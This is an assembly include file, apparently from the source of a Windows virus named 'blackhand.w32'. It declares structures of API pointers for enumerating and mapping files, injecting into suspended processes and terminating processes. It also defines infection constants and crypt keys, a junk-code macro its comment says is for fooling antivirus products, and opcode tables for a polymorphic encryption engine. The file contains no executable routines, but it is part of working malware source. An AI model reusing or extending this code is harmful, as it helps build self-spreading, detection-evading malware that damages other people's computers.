; my include file for blackhand.w32
;
;
;
host_size    equ  70h
crypted_size equ (__end_crypted-__crypted)/4
signature   equ  0deadc0deh
valid       equ  0deadbeefh
stacksize   equ  100000h
timeruning  equ  1000*60*10              ;10 minutes  
PROCESS_TERMINATE equ 0001h
PROCESS_VM_READ   equ 0010h

data_structure struct
	kernel32base            dd  ?
	pVirtualProtect         dd  ?
	pVirtualAlloc           dd  ? 
	pFindFirstFileA         dd  ?
	pFindNextFileA          dd  ?
	pCreateFileA            dd  ?
	pCreateFileMappingA     dd  ?
	pMapViewOfFile          dd  ?
	pCloseHandle            dd  ?
	pUnmapViewOfFile        dd  ?
	pVirtualFree            dd  ?
	pLoadLibraryA           dd  ?
	pCreateThread           dd  ?
	pWaitForMultipleObjects dd  ?
	pWaitForSingleObject    dd  ?
	pExitProcess            dd  ?
	pExitThread             dd	?
	pFindClose              dd  ?
	pSetCurrentDirectoryA   dd  ?
	pWriteProcessMemory     dd  ?
	pCreateProcessW         dd  ?
	pResumeThread           dd  ?
	pGetTickCount           dd  ?
	pTerminateProcess       dd  ?
	pOpenProcess            dd  ?
	pReadProcessMemory      dd  ?
	psapibase               dd  ?
	pEnumProcesses          dd  ?
	procBuff                dd  ?
	processID               dd  ?
	wfdptr                  dd  ?
	fd                      dd  ?
	temp                    dd  ?
	memptr                  dd  ?
	currbase                dd  ?
	newsize                 dd  ?
	fsize                   dd  ?
	fname                   dd  ?
	user32base              dd  ?
	pMessageBoxA            dd  ?	
	nthdr                   dd  ?
	viristart               dd  ?
	pinfo                   dd  ?
	wfmo1                   dd  ?
	wfmo2                   dd  ?
	dummy                   dd  ?
	cryptkey                dd  ?
	cryptkey2               dd  ?
	gene                    dd  ?
	oldhost                 dd  ?
	selected_host           dd  ?
	selected_host_size      dd  ?
	random_seed             dd  ?
data_structure ends

CREATE_SUSPENDED		equ	00000004h

PROCESS_STRUCT	struct
pi_hProcess		dd	  ?		
pi_hThread		dd	  ?		
pi_dwProcessId	dd	  ?	
pi_dwThreadId		dd	  ?		
si_cb			dd	  ?		
si_lpReserved		dd	  ?		;(reserved)
si_lpDesktop		dd	  ?		;desktop name
sl_lpTitle		dd	  ?		;console window title
si_dwX			dd	  ?		;window origin (column)
si_dwY			dd	  ?		;window origin (row)
si_dwXSize		dd	  ?		;window width
si_dwYSize		dd	  ?		;window height
si_dwXCountChars	dd	  ?		;screen buffer width
si_dwYCountChars	dd	  ?		;screen buffer height
si_dwFillAttribute	dd	  ?		;console window initialization
si_dwFlags		dd	  ?		;structure member flags
si_wShowWindow		dw	  ?		;ShowWindow() parameter
si_cbReserved2		dw	  ?		;(reserved)
si_lpReserved2		dd  ?		;(reserved)
si_hStdInput		dd	  ?		;standard input handle
si_hStdOutput		dd	  ?		;standard output handle
si_hStdError		dd	  ?		;standard error handle
PROCESS_STRUCT		ends

;-------------------------------
;Just dummy code for fulling AVs
;-------------------------------
@garbage MACRO
					nop
					nop
					push eax
					push ebx
					sub eax, eax
					mov ebx, eax
					pop ebx
					pop eax
					nop
					nop
endm

mov12  equ 10001001b  ;11regreg 
mov21  equ 10001011b  ;11regreg

xor12  equ 00110001b  ;11reg reg
xor21  equ 00110011b  ;11reg reg
xoreax equ 10010000b  ;xor eax/reg

rorp   equ 1100001b   ;,  11001000b ;reg : imm8
rolp   equ 1100001b   ;,  11000000b ;reg : imm8

pushb  equ 01010000b  ;push reg
popb   equ 01011000b  ;pop reg
negb   equ 11110111b  ;, 11011000b ;neg reg
direction equ 00000010b

pushadb equ 01100000b
popadb  equ 01100001b
regeax  equ 00000000b
regecx  equ 00000001b
regedx  equ 00000010b
regebx  equ 00000011b
regesp  equ 00000100b
regebp  equ 00000101b
regesi  equ 00000110b
regedi  equ 00000111b
nopb    equ 90h

; used for poly lodsd/stosd
lodsdb equ 0ADh
stosdb equ 0ABh
movesi equ 068bh     ;8b06h
addesi equ 9004c683h ;83C604h
movedi equ 0789h     ;8907h
addedi equ 9004C783h ;83C704h